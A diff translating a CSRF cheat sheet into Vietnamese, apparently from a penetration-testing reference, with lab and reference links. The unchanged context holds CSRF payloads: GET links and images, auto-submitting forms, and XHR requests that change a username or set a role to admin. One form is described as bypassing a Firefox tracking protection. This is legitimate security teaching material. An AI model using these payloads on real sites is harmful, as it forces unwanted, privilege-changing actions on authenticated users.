@@ -1,45 +1,45 @@
-# Cross-Site Request Forgery
+# Giả Mạo Yêu Cầu Liên Trang (Cross-Site Request Forgery)
 
-> Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. - OWASP
+> Giả mạo yêu cầu liên trang (CSRF/XSRF) là một cuộc tấn công buộc người dùng cuối thực hiện các hành động không mong muốn trên một ứng dụng web mà họ đang được xác thực. Các cuộc tấn công CSRF nhắm mục tiêu cụ thể vào các yêu cầu làm thay đổi trạng thái, chứ không phải đánh cắp dữ liệu, vì kẻ tấn công không có cách nào để xem phản hồi của yêu cầu bị giả mạo. - OWASP
 
-## Summary
+## Tóm tắt
 
-* [Tools](#tools)
-* [Methodology](#methodology)
-    * [HTML GET - Requiring User Interaction](#html-get---requiring-user-interaction)
-    * [HTML GET - No User Interaction](#html-get---no-user-interaction)
-    * [HTML POST - Requiring User Interaction](#html-post---requiring-user-interaction)
-    * [HTML POST - AutoSubmit - No User Interaction](#html-post---autosubmit---no-user-interaction)
-    * [HTML POST - multipart/form-data With File Upload - Requiring User Interaction](#html-post---multipartform-data-with-file-upload---requiring-user-interaction)
-    * [JSON GET - Simple Request](#json-get---simple-request)
-    * [JSON POST - Simple Request](#json-post---simple-request)
-    * [JSON POST - Complex Request](#json-post---complex-request)
-* [Labs](#labs)
-* [References](#references)
+* [Công cụ](#tools)
+* [Phương pháp](#methodology)
+    * [HTML GET - Yêu Cầu Tương Tác Người Dùng](#html-get---requiring-user-interaction)
+    * [HTML GET - Không Cần Tương Tác Người Dùng](#html-get---no-user-interaction)
+    * [HTML POST - Yêu Cầu Tương Tác Người Dùng](#html-post---requiring-user-interaction)
+    * [HTML POST - Tự Động Gửi - Không Cần Tương Tác Người Dùng](#html-post---autosubmit---no-user-interaction)
+    * [HTML POST - multipart/form-data Kèm Tải File - Yêu Cầu Tương Tác Người Dùng](#html-post---multipartform-data-with-file-upload---requiring-user-interaction)
+    * [JSON GET - Yêu Cầu Đơn Giản](#json-get---simple-request)
+    * [JSON POST - Yêu Cầu Đơn Giản](#json-post---simple-request)
+    * [JSON POST - Yêu Cầu Phức Tạp](#json-post---complex-request)
+* [Bài Lab](#labs)
+* [Tài Liệu Tham Khảo](#references)
 
-## Tools
+## Công cụ
 
-* [0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe) - The Prime Cross Site Request Forgery Audit and Exploitation Toolkit.
+* [0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe) - Bộ công cụ kiểm tra và khai thác giả mạo yêu cầu liên trang hàng đầu.
 
-## Methodology
+## Phương pháp
 
 ![CSRF_cheatsheet](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Cross-Site%20Request%20Forgery/Images/CSRF-CheatSheet.png)
 
-When you are logged in to a certain site, you typically have a session. The identifier of that session is stored in a cookie in your browser, and is sent with every request to that site. Even if some other site triggers a request, the cookie is sent along with the request and the request is handled as if the logged in user performed it.
+Khi bạn đăng nhập vào một trang web nào đó, bạn thường có một phiên (session). Định danh của phiên đó được lưu trong một cookie trên trình duyệt của bạn, và được gửi kèm theo mọi yêu cầu tới trang web đó. Ngay cả khi một trang web khác kích hoạt một yêu cầu, cookie vẫn được gửi kèm theo yêu cầu và yêu cầu đó được xử lý như thể chính người dùng đã đăng nhập thực hiện.
 
-### HTML GET - Requiring User Interaction
+### HTML GET - Yêu Cầu Tương Tác Người Dùng
 
 ```html
 <a href="http://www.example.com/api/setusername?username=CSRFd">Click Me</a>
 ```
 
-### HTML GET - No User Interaction
+### HTML GET - Không Cần Tương Tác Người Dùng
 
 ```html
 <img src="http://www.example.com/api/setusername?username=CSRFd">
 ```
 
-### HTML POST - Requiring User Interaction
+### HTML POST - Yêu Cầu Tương Tác Người Dùng
 
 ```html
 <form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
@@ -48,7 +48,7 @@ When you are logged in to a certain site, you typically have a session. The iden
 </form>
 ```
 
-### HTML POST - AutoSubmit - No User Interaction
+### HTML POST - Tự Động Gửi - Không Cần Tương Tác Người Dùng
 
 ```html
 <form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
@@ -61,7 +61,7 @@ When you are logged in to a certain site, you typically have a session. The iden
 </script>
 ```
 
-### HTML POST - multipart/form-data With File Upload - Requiring User Interaction
+### HTML POST - multipart/form-data Kèm Tải File - Yêu Cầu Tương Tác Người Dùng
 
 ```html
 <script>
@@ -82,7 +82,7 @@ function launch(){
 <button value="button" onclick="launch()">Submit Request</button>
 ```
 
-### JSON GET - Simple Request
+### JSON GET - Yêu Cầu Đơn Giản
 
 ```html
 <script>
@@ -92,9 +92,9 @@ xhr.send();
 </script>
 ```
 
-### JSON POST - Simple Request
+### JSON POST - Yêu Cầu Đơn Giản
 
-With XHR :
+Với XHR:
 
 ```html
 <script>
@@ -109,7 +109,7 @@ xhr.send('{"role":admin}');
 </script>
 ```
 
-With autosubmit send form, which bypasses certain browser protections such as the Standard option of [Enhanced Tracking Protection](https://support.mozilla.org/en-US/kb/enhanced-tracking-protection-firefox-desktop?as=u&utm_source=inproduct#w_standard-enhanced-tracking-protection) in Firefox browser :
+Với biểu mẫu tự động gửi, giúp vượt qua một số cơ chế bảo vệ nhất định của trình duyệt như tùy chọn Standard của [Enhanced Tracking Protection](https://support.mozilla.org/en-US/kb/enhanced-tracking-protection-firefox-desktop?as=u&utm_source=inproduct#w_standard-enhanced-tracking-protection) trên trình duyệt Firefox:
 
 ```html
 <form id="CSRF_POC" action="www.example.com/api/setrole" enctype="text/plain" method="POST">
@@ -121,7 +121,7 @@ With autosubmit send form, which bypasses certain browser protections such as th
 </script>
 ```
 
-### JSON POST - Complex Request
+### JSON POST - Yêu Cầu Phức Tạp
 
 ```html
 <script>
@@ -133,7 +133,7 @@ xhr.send('{"role":admin}');
 </script>
 ```
 
-## Labs
+## Bài Lab
 
 * [PortSwigger - CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)
 * [PortSwigger - CSRF where token validation depends on request method](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method)
@@ -144,7 +144,7 @@ xhr.send('{"role":admin}');
 * [PortSwigger - CSRF where Referer validation depends on header being present](https://portswigger.net/web-security/csrf/lab-referer-validation-depends-on-header-being-present)
 * [PortSwigger - CSRF with broken Referer validation](https://portswigger.net/web-security/csrf/lab-referer-validation-broken)
 
-## References
+## Tài Liệu Tham Khảo
 
 * [Cross-Site Request Forgery Cheat Sheet - Alex Lauerman - April 3, 2016](https://web.archive.org/web/20220926223539/https://trustfoundry.net/cross-site-request-forgery-cheat-sheet/)
 * [Cross-Site Request Forgery (CSRF) - OWASP - April 19, 2024](https://web.archive.org/web/20120920091432/https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))
